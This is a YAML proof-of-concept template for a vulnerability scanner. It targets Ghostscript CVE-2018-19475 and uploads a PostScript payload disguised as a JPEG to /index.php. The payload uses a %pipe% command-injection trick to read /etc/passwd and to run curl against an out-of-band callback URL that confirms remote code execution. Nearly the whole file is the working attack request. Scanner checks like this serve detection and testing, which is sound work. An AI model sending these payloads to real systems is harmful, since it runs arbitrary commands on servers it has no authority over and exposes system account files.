name: poc-yaml-ghostscript-cve-2018-19475-rce
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    f1: randomLowercase(5)
    f2: randomLowercase(10)
payloads:
    payloads:
        curl:
            cmd: |
                "curl -v " + string(reverseURL) + " > /tmp/curltest"
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO
            body: "------WebKitFormBoundaryukZmnyhO\r\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"{{f1}}.jpg\"\r\ncontent-Type=\"image/png\"\r\n\n%!PS\r\n0 1 300367 {} for\r\n{save restore} stopped {} if\r\n(%pipe%cat /etc/passwd > /tmp/{{f2}} && cat /tmp/{{f2}}) (w) file\r\n------WebKitFormBoundaryukZmnyhO--\r\n"
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r2:
        request:
            cache: true
            method: POST
            path: /index.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO
            body: "------WebKitFormBoundaryukZmnyhO\r\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"{{f1}}.jpg\"\r\ncontent-Type=\"image/png\"\r\n\n%!PS\r\n0 1 300367 {} for\r\n{save restore} stopped {} if\r\n(%pipe%{{cmd}}) (w) file\r\n------WebKitFormBoundaryukZmnyhO--\r\n"
        expression: response.status == 200 && reverse.wait(10)
expression: r1() || r2()
detail:
    author: Monday
    links:
        - https://github.com/vulhub/vulhub/blob/9cdd452ce2ccc0495a8aa4d5ecfa952417712344/ghostscript/CVE-2018-19475/README.md
    vulnerability:
        id: CT-55915
        level: high
    warning: 注意该脚本会上传文件产生一个临时的无害文件
